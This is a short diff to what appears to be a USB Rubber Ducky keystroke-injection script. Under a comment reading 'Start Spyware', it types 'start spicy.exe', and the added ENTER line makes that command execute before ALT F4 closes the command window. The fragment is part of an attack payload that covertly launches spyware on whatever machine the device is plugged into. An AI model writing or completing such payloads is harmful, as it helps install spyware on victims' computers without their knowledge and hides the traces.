@@ -32,6 +32,7 @@ ENTER
 DELAY 10000
 REM ---------Start Spyware---------
 STRING start spicy.exe
+ENTER
 DELAY 3000
 REM ---------close cmd---------
 ALT F4
